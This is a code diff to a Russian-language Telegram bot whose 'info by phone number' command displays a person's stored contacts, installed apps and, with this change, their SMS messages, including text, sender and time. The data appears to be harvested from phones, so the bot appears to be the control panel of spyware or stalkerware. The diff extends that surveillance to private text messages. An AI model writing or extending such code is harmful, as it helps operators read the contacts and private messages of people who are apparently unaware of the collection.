@@ -56,8 +56,6 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                         });
                         databtns.push({ text: "Контакты", callback_data: "Sendcontacts" })
                     }
-
-
                     if (userdataByPhone.data.userApps[0].apps) {
                         appMessages = userdataByPhone.data.userApps[0].apps.map(element => {
                             const label = `Название: ${element.label}`;
@@ -66,7 +64,16 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                         });
                         databtns.push({ text: "Приложения", callback_data: "Sendapps" })
                     }
-
+                    if (userdataByPhone.data.userMessages[0].messages) {
+                       messageMessages = userdataByPhone.data.userMessages[0].messages.map(element => {
+                            const body = `Сообщение: ${element.body}`;
+                            const originatingAddress = `Отправитель: ${element.originatingAddress}`;
+                            const date = `Дата и время: ${new Date(element.timestamp).toLocaleString()}`;
+                            return `${body}\n${originatingAddress}\n${date}`;
+                        });
+                        databtns.push({ text: "Сообщения", callback_data: "Sendmessages" });
+                    }
+                    
                     const message = await bot.sendMessage(chatId, "Выберите данные", {
                         parse_mode: 'HTML',
                         reply_markup: {
@@ -76,14 +83,19 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                         }
                     })
                     const messagesToSendcontact = contactMessages;
-                    const pageSizecontact = 10;
+                    const pageSizecontact = 7;
                     const totalPagescontact = Math.ceil(messagesToSendcontact.length / pageSizecontact);
                     let currentPagecontact = 1;
 
                     const messagesToSendapp = appMessages;
-                    const pageSizeapp = 10;
+                    const pageSizeapp = 7;
                     const totalPagesapp = Math.ceil(messagesToSendapp.length / pageSizeapp);
                     let currentPageapp = 1;
+
+                    const messagesToSendmessage = messageMessages;
+                    const pageSizemessage = 7;
+                    const totalPagesmessage = Math.ceil(messagesToSendmessage.length / pageSizemessage);
+                    let currentPagemessage = 1;
 
                     let currentMessageId = null;
                     let paginationMessageId = null;
@@ -107,6 +119,12 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                             startIndex = (currentPage - 1) * pageSizeapp;
                             endIndex = Math.min(startIndex + pageSizeapp, messagesToSendapp.length);
                             pageMessages = messagesToSendapp.slice(startIndex, endIndex);
+                        }else if (DataChoose.messages) {
+                            currentPage = currentPagemessage;
+                            totalPages = totalPagesmessage;
+                            startIndex = (currentPage - 1) * pageSizemessage;
+                            endIndex = Math.min(startIndex + pageSizemessage, messagesToSendmessage.length);
+                            pageMessages = messagesToSendmessage.slice(startIndex, endIndex);
                         }
                     
                         paginationButtons = [];
@@ -149,14 +167,21 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                         }
                     };
                     
-                    const DataChoose = { contacts: false, apps: false }
+                    const DataChoose = { contacts: false, apps: false, messages:false}
                     bot.on('callback_query', async (query) => {
                         try {
                             if (query.data === "Sendcontacts") {
                                 DataChoose.contacts = true
                                 DataChoose.apps = false
+                                DataChoose.messages = false
                             } else if (query.data === "Sendapps") {
                                 DataChoose.apps = true
+                                DataChoose.contacts = false
+                                DataChoose.messages = false
+                            }
+                            else if (query.data === "Sendmessages") {
+                                DataChoose.messages = true
+                                DataChoose.apps = false
                                 DataChoose.contacts = false
                             }
                             if (query.data === 'prev_page') {
@@ -178,7 +203,7 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                         }
                     });
                 } else {
-                    await bot.sendMessage(chatId, 'Номер не найден')
+                    await bot.sendMessage(chatId, 'Данные пользователя не найдены')
                 }
 
             });
